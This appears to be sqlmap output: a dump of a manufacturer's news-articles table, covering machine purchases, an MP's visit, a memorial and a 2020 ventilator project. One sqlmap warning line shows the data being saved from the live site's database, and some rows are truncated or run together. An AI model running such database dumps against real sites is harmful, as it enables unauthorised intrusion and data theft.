| 26  | <p>Battlefield International was pleased to spend a Saturday with an important member of General Dynamics Land Systems Australia engineering team. Battlefield\x92s international sales manager Michael Falk (seen on the left), hosted the tour of our facility reviewing our equipment and state of the art manufacturing components.</p>\r\n\r\n<p>We were also able to demonstrate some of our land system-specific quick connect coupler design tools and technology. Since it was a Saturday, we decided to invite him along to spend some of the fall weekend in Canada the way we prefer. Thankfully our guest was a good sport about it and agreed to ride along. He also taught us a thing or two about remaining upright through a slick damp windy trail covered in slippery leaves.

This property includes a small, clean ambulance center that will be converted to enable more room for overflow storage and possibly light assembly.</p>\r\n\r\n<p>The installation of our recently acquired CNC equipment at our main facility has begun to encroach our assembly and test area. For this reason along with the ever increasing demands from our customers for product development and increased production, we have begun a season of necessary expansion. This additional facility will provide us with a little more breathing room as we do our best to manage our growth.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | article.php?id=41  | images/news/2015/december/linkroad.jpg       | Additional Property Acquired to Enable Ongoing Growth                  | 2015-12-21 14:48:21 | <blank> |

| 45  | <p>Our George Wozny (affectionately known as Mr. W), has supported our company and our owners entrepreneurial efforts since 1987. He has been a crucial part of our team from the very beginning and today at 90 years young, his enthusiasm is infectious. Mr \x93W\x94 was with us when we received our first CNC lathe in 1997 and he is \x93on the job\x94 as our latest machine arrives 18 years later.  We were delighted that he was on hand to receive our first EuroTech.</p>\r\n\r\n<p>We are excited about the increased production capability this new advanced lathe will enable our firm. Here is a rundown of the key machine characteristics we are looking forward to tapping into:</p>\r\n\r\n<p>1. Increased bar feeding capacity to 4\x94 diameter enabling the efficient production of large parts.</p>\r\n\r\n<p>2. 23hp, 10,000rpm live tooling gives us the power and speed to mill both aluminum, stainless and hard steel efficiently.</p>\r\n\r\n<p>3.

| 46  | <p>Battlefield International was visited by Haldimand - Norfolk MP Diane Finley on September 22, 2015 while she was on her campaign trail. After a tour that included individual visits with staff members in the plant, Minister Finley spoke to all employees in our staff lunch room.</p>\r\n\r\n<p>Among other things, Minister Finley pointed out that the Conservative government has cut taxes for small business to assist manufacturing facilities like ours to remain healthy in difficult times while also fostering an environment that better enables new job creation. Our company has benefited through Minister Finley\x92s leadership and assistance over the past several years while she has been in office.</p>\r\n\r\n<p>She has assisted us in understanding and implementing all of the requirements to market our Canadian designed and manufactured products to the US military. Minister Finley made it clear that whether or not we vote for her, it is very important that all Canadians examine the competing party platforms and to get out and vote.\r\n</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 [12:08:40] [WARNING] writing binary ('application/octet-stream') content to file '/root/.local/share/sqlmap/output/www.battlefield.biz/dump/battlefi_db/body-99815741.bin'

| 82  | <p>We took delivery of two very competent machines to ensure we continue to maintain our expected class-leading short production and prototype delivery times. Our new Matsuura MX-330 5 axis mill augments our current 5 axis milling capability to our existing 5 axis Fanuc Robodrill D21LiA5 and 5 axis Nakamura Tome NTRX-300 by improving our ability to machine larger complex parts for our land systems customers. Our second new machine procured is a Nakamura Tome WT-150IIMMYS.</p>\r\n\r\n<p>Our new "Nak" is equipped with 1000psi high pressure coolant coupled with the two turrets and two spindles to enhance our high productivity and capacity.

| 116 | <p>Battlefield lost one of our most important company pioneers on Feb 3rd, 2020. George Wozny is the father of one of our owners and the father-in-law of the other.</p>\r\n\r\n<p>From a company perspective, it could be stated that Battlefield would not exist today had Mr. "W" (as he is fondly known) not taken part in our small business startup and helped us every step of the way after that.</p>\r\n\r\n<p>He retired after working 35 years at Stelco only to spend his next 29 years helping us many times around the clock from 1987 at our previous business right through until 2016 for Battlefield. Mr. W helped us manufacture ISO Cylinders, build control panels, performed our pickup and delivery tasks and generally poured himself into any area of our business that required help.</p>\r\n\r\n<p>His curiosity for all things technical, coupled with his enthusiasm for our company goals, his encouraging heart and focus on others, set him apart from the rest of us. He will be sorely missed.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | article.php?id=116 | images/news/2020/feb/mrw.jpg                 | George Wozny August 1st 1925 to Feb 3rd 2020                           | 2020-02-04 10:30:06 | <blank> |
| 117 | <p>Looking for Purchasing and Supply Chain volunteers to help with our COVID 19 fight.</p>\r\n\r\n<p>Battlefield International Inc. Is looking for volunteers to help us speed along the realization of our automation kit for manual ventilators we are developing at light speed. We have been developing this under the full direction of our medical friends at Hamilton Health Sciences. Right now, there are innovative people doing their best to design ventilators all over the world. There are lots of great ideas and we wish every developer well.</p>\r\n\r\n<p>Our approach is one where we are trying to include the best possible control and adjustability to enable doctors to vary the most parameters they wish to have access to for unique patient needs.</p>\r\n\r\n<iframe width="100%" height="230px" src="https://www.youtube.com/embed/rjoUI0ke4Uc" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>\r\n\r\n<p>After extensive meetings with local medical experts to ensure our approach will be the best technically it can be, we are having our final design meeting tonight. Our designers are working right through until morning to finalize the design and lock it in. First thing tomorrow our CNC programmers and machining staff are going to work as long as possible Tuesday, right through the night if necessary to be sure the parts are available the first possible moment. Our staff are donating their overtime to this cause and have a passion for getting this done. We are still doing our best to meet our Aerospace and Defense customer needs during regular work hours.</p>\r\n\r\n<p>Once our design is locked in, we will be identifying performance characteristics required for many ventilator control panel valves, timers, flow controls, pneumatic circuitry and fittings. The task we need help with is to locate volunteers who will go online and try to locate products that both meet the specifications of each component. But it's also critical that they are also available in quantity. Interested parties should send their resume's for these volunteer positions to <b>info@battlefield.biz</b>.</p>\r\n\r\n<p>As soon as our product fully meets the preferred criteria the medical community would like to have, we will be releasing the design and drawings online so it can be copied and produced by any company or people that are able to produce them to help this cause.</p>\r\n\r\n<p>I can promise you, should you be able and willing to help, the negative effects on the mood of all of us when pondering this unfortunate pandemic with be replaced in part with hopefulness. We will be choosing who to work with by locating the most experienced, quick and dedicated people we can find. Pneumatic systems experience would be another helpful quality.</p>\r\n\r\n<p><i>-Stephen Fenton,</i>\r\n<br>President Battlefield International Inc.</p> | article.php?id=117 | images/news/2020/mar/ventilator.jpg          | In Search of Purchasing & Supply Chain Volunteers                      | 2020-03-30 15:03:53 | <blank> |
| 118 | <p>Here is where we are with our manual ventilator automation project. This is a render and not a photo.</p>\r\n\r\n<p>Changes from this image include adding carrying handles, and the control panel will have a slightly different layout and we will mark the function of the switches and dials with bright white laser marking. We are presently completing the electric circuitry, and we are going to add a mode that enables the patient's natural breathing to control the pulses.</p>\r\n\r\n<p>When the patient begins naturally drawing in air, a pressure sensor uses that to signal an assisted breath. By tomorrow, we should have more than half of the raw materials here for the 100 unit production. Trying to get this done quick, but also make it the way it should be made.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | article.php?id=118 | images/news/2020/apr/ventilator4.jpg         | Manual Ventilator Automation Project                                   | 2020-04-15 08:07:00 | <blank> |

There are glimmers of "good" that comes from the hearts of individuals and their corporations who want to make a difference. Alectra Utilities has shown they are more than a "bottom line" company in providing their capable team member Mike to us to populate our MVAC electronics cards while paying his wages to assist us.</p>\r\n\r\n<p>You can see how tiny some components are that Mike is working with in the attached pic. Our country needs more corporations like Alectra Utilities that are run by people who have true hearts for their community.</p>\r\n\r\n<div class="blueBTN"><a href="http://www.alectrautilities.com" target="_blank">VISIT ALECTRA</a></div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | article.php?id=121 | images/news/2020/may/montgomery.jpg          | Ventilator produced with help from Alectra Utilities & Mike Montgomery | 2020-05-06 10:16:12 | <blank> |
| 122 | <p>Had our first ventilator MVAC assessment today at Hamilton General. We were there three hours and the medical staff were taught how to use the device. They made some minor requests for some code changes but all in all, the assessment was a great success. Several doctors came by to see it and we left one there for continued assessment.</p>\r\n\r\n<p>We now are confident that once we make the suggested updates to the program, that our MVAC could fill a need should we reach a place where there was an urgent shortage of ventilators. We were able to demonstrate our patient instigated breath timing mode as well.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | article.php?id=122 | images/news/2020/may/mvacTest.jpg            | MVAC review at Hamilton General Lab                                    | 2020-05-14 15:09:32 | <blank> |
